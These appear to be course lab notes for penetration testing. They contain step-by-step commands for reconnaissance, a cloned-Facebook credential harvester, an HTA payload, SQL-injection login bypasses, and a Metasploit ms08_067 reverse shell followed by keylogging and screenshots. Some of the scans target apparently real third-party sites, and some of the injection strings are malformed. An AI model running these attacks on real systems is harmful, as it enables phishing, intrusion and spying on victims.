@@ -1,0 +1,443 @@
+cyberhia.com
+
+Banking Website
+https://demo.testfire.net/login.jsp
+Ecommerce Website
+https://juice-shop.herokuapp.com/#/login
+Vulnerable Site for testing different attacks
+http://<your-metasploitable-ip>/mutillidae
+http://<your-metasploitable-ip>/dvwa
+More Vulnerable Test Websites
+http://www.vulnweb.com/
+http://testphp.vulnweb.com/
+WP Website to run WPScan
+https://blogs.overandall.com
+
+
+prac2
+Use of open-source intelligence and passive reconnaissance
+
+[Sublist3r]
+
+sudo apt-get update
+
+sudo apt install sublist3r
+
+sublist3r -d packtpub.com -t 3 -e bing
+
+[Maltego]
+
+sudo apt install maltego 
+
+** for further details refer to pdf **
+
+[OSR Framework]
+
+sudo apt install python3-pip
+
+sudo pip install osrframework
+
+sudo usufy -n cyberhia  
+
+sudo searchfy -q testfire
+
+sudo mailfy -n cyberhia  
+
+[Web Archives]
+
+Tool: CacheView
+open the website https://cachedview.com/ and in the search box type 'cyberhia.com' and hit enter
+
+Tool: Wayback Machine
+open the website https://web.archive.org/ and in the search box type 'cyberhia.com' and hit enter
+
+[Web Scraping]
+
+theHarvester -d github.com -l 500 -b bing
+
+[Obtaining user information]
+
+open the TinEye website and put in the image or image url in the searchbox and hit enter
+
+[Online Search Portals]
+
+Tool: Shodan
+open the website https://www.shodan.io/ and search for "linux"
+
+Tool: censys
+open the website https://search.censys.io/ and search for rdnational.ac.in
+
+[Google Hacking Database]
+
+put (inurl:/wp-content/uploads/ ext:txt “username” AND “password” | “pwd” | “pw”) and (intitle: “webcamXP 5”) in google search engine
+
+[Security Breaches]
+
+open https://haveibeenpwned.com/ and type in your email address to check if your email has been pawned
+
+[Profiling users for password lists]
+
+Tool: CUPP (Common User Password Profiler)
+
+sudo apt install cupp
+
+cupp -i
+
+(and enter the details according to your needs)
+
+cat <yourfilename>.txt
+
+cat <yourfilename>.txt | head -n 10
+
+wc <yourfilename>.txt
+(wc stands for word count)
+
+[Creating custom wordlists for cracking password]
+
+sudo apt install cewl
+
+cewl www.google.com -w google.txt
+
+cat google.txt
+
+cat google.txt | head -n 10
+
+wc google.txt
+
+
+----------------------------------------------------------------------------
+
+prac 3
+Practical on enumerating host, port, and service scanning.
+
+A] port scanning
+
+**kali**
+man nmap
+
+**metasploit**
+ ifconfig
+
+**kali**
+
+sudo nmap -v -p 0-65535 -A <metasploit_ip_address> oA metasploitable2
+
+ls
+
+cat metasploitable2.nmap
+
+B] enumetation of hosts
+
+sudo nmap -sS -O <metasploit_ip_address>
+
+sudo nmap -sV <metasploit_ip_address>
+
+
+Using Legion we can also perform enumeration and search for open service ports
+Specify the IP Subnet and Bits as shown and click on submit.
+After submitting it will start scanning all the available hosts in that subnet and you will see the Metasploitable2 Operating system also displayed in the scan.
+
+C] dns enumeration
+
+host packtpub.com
+
+host -t ns packtpub.com
+
+host -t mx packtpub.com
+
+nslookup
+>set type=ns
+>packtpub.com
+
+dig packtpub.com
+
+dig packtpub.com mx
+
+dig packtpub.com mb/ptr/uid/soa/mg
+
+---------------------------------------------------------------------------
+prac4
+
+A] Vulnerability Scanning using Nmap
+
+1. Navigate to nmap scripts folder and view all the scripts in that folder.
+cd /usr/share/nmap/scripts 
+
+ls | wc -l
+
+ls -la | more
+
+2. Update scripts.
+sudo nmap --script-updatedb
+
+3. Run Nmap to check vulnerability services running on metasploitable2.
+sudo nmap -sC <your_metaspolitable_IP_address>
+
+4. Let us find available scripts to find vulnerability for ssh.
+ls | grep ssh
+
+nmap --script-help ssh2-enum-algos
+
+5. Get more info on ssh-run script.
+nmap --script-help ssh-run
+
+6. Let’s run the ssh-run script on our target (metasploitable2 IP Address).
+nmap --script=ssh-run <your_metaspolitable_IP_address>
+
+7. Get available scripts for http
+ls | grep http
+
+
+
+B] Web Server Vulnerability Scanning
+
+1. Run metasploitable2 website on firefox in kali linux
+
+2. Using Nikto tool scan the target for vulnerabilities.
+
+* kali *
+nikto -host 192.168.136.132
+
+As you can see php5 has many vulnerabilities when installed on server.
+
+3. By running <targetIP>/phpinfo.php you can get information about the php version. (on firefox)
+
+
+C] Customizing Nikto
+
+1. List all the plugins in the Nikto tool.
+nikto -list-plugins | more 
+
+2. Running Nikto with specific plugin to find active users on the target server
+sudo nikto -h <your_metasploitable_IP_address> -p 80 -Plugins "apacheusers(enumerate,dictionary:users.txt);report_xml" -output apacheusers.xml
+
+cat apacheusers.xml
+
+
+D] OWASP ZAP
+
+One of the most effective scanners based on the number of verified vulnerabilities discovered in OWASP ZAP. This tool is not installed in Kali Linux 2021.
+
+1. Install the latest version of OWASP ZAP by:
+* kali *
+sudo apt install zaproxy
+
+2. Run the tool (on kali)
+
+3. On start-up make the appropriate selections and update the plugins.
+
+4. After the scan you can click on the identified results to drill down to specific findings. 
+OWASP ZAP can help you find vulnerabilities such as reflected cross-site scripting, 
+stored cross-site scripting, SQL injection, and remote OS command injection
+
+-------------------------------------------------------------------------
+
+prac 5
+Practical on use of Social Engineering Toolkit.
+
+A] Credentials Harvester Attack  
+
+1. Install the Social Engineering Toolkit. 
+
+sudo setoolkit
+
+(Select option) 1
+(Select option) 2
+(Select option) 3
+(Select option) 1
+
+(Put the IP address of attacking system)
+
+(Select option) 2
+
+(Put the IP address on firefox browser in kali)
+
+(Fill in the email id and password)
+(Check the username and password on terminal )
+
+restart the terminal
+
+(Try the same step by choosing Site Cloner to create a Facebook page.)
+ctrl + c
+
+sudo setoolkit
+
+(Select option) 1
+(Select option) 2
+(Select option) 3
+(Select option) 2
+
+(Put the IP address of attacking system)
+
+http://wfacbook.com
+
+(Put the IP address on firefox browser in kali)
+
+
+
+B] HTA web attack method 
+
+1. Select Web Attack Vectors.
+
+sudo setoolkit
+
+(Select option) 1
+
+(Select option) 2
+
+(Select option) 7
+
+(Select option) 2
+
+http://www.facebook.com
+
+(Enter IP address )
+
+443
+
+(Select option) 3
+
+((now go on your main windows os and turn off the windows firewall)
+(open the web browser on your main windows pc and put the ip_address in the browser and a file will be downloaded)
+(run the downloaded file and now go to kali linux)
+
+sessions
+
+sessions <sessions_id>
+
+sysinfo
+
+ipconfig
+
+pwd
+
+cd 
+
+cd ..
+
+pwd
+
+ls
+
+pwd
+
+-----------------------------------------------------------------------------
+prac 6
+Practical on Exploiting Web-based applications
+
+sudo nmap -vv -p 80 http-waf-detect www.cyberhia.com 
+
+wafw00f cyberhia.com
+
+sudo lbd www.cyberhia.com 
+
+sudo wpscan --url https://pinchofyum.com
+
+[Cloning Website using DirBuster.]
+Select the Wordlist from /usr/share/dirbuster/wordlists/
+
+(refer to pdf for more instructions)
+(all the actions are to be performed in the DirBuster application)
+(link: http://testfire.net:80/)
+(name of the wordlist is: directory-list-1.0.txt)
+
+* kali * 
+sudo apt install httrack  
+
+sudo httrack http://testfire.net -O copied_ssite
+
+sudo httrack http://10.10.10.100/mutillidae -O local-Mutillidae
+
+C] Using Burp Proxy for Scans.
+ open => BurpSuite=> Target => OpenBrowser => (testfire.net) => get method right click on it and choose add to scope => Dashboard => new live task => live passive crawl, proxy, everything => then go to scan configuration => New => Save as DeepCrawl => Ok => Proxy => intercept on => go to browser and put in login details
+
+
+
+admin'#
+admin'_
+1=1#
+1==1__
+1=1
+'OR1=1#
+'OR1=1__
+
+(refer to pdf)
+
+
+D] Using the Brute Force Attack to find the login details.
+
+---------------------------------------------------------------------------
+
+prac 7
+Practical on Using Metasploit Framework for exploitation   
+
+
+
+sudo systemctl start postgresql.service
+
+sudo msfdb init   
+
+sudo msfconsole
+
+db_status
+
+workspace
+
+workspace -a prac7
+
+(Open windows XP)
+(ipconfig)
+
+
+
+db_nmap -vv -sC -Pn -p- <IPADDRESSWINDOWSXP> --save
+
+services
+
+traceroute <IPADDRESSWINDOWSXP>
+
+search exploit/windows/smb
+
+search exploit/windows/smb/ms08_067_netapi
+
+use 0
+
+set payload windows/meterpreter/reverse_tcp
+
+options
+
+set rhosts <IPADDRESSWINDOWSXP>
+
+set lport 4444
+
+exploit
+
+sysinfo
+
+shell
+
+ipconfig
+
+dir
+
+(Ctrl + C and y)
+
+webcam_list
+
+ps
+
+migrate 1564
+
+keyscan_start
+
+key_scan dump
+
+kill 284
+
+screenshot
+
+shutdown
+
+
+ 
+
